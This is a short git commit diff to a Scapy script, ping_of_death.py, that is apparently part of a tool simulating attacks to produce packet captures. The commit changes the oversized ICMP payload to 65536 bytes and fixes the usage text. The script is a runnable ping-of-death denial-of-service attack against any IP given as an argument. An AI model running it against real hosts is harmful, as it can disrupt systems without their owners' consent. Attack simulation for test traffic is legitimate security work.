407b5638735bd9b31a7fbcc6c30e6a21a208e3e6
Luong NGUYEN <luongnv89@gmail.com>
2023-04-25 16:43:18 +0200

    correct the target ip in pcap simulation attacks

--- src/scripts/ping_of_death.py
+++ src/scripts/ping_of_death.py
@@ -2,13 +2,13 @@ import sys
 from scapy.all import *
 
 def start_ping_of_dead_attack(targetIP):
-  send( fragment(IP(dst=targetIP)/ICMP()/("X"*66000)) )
+  send( fragment(IP(dst=targetIP)/ICMP()/("X"*65536)) )
 
 if __name__ == '__main__':
     argv_len = len(sys.argv)
     if  argv_len < 2:
         print("Invalid input arguments")
-        print("python ping_of_dead.py <targetIP>")
+        print("python ping_of_death.py <targetIP>")
     else:
         targetIP = sys.argv[1]
         start_ping_of_dead_attack(targetIP)
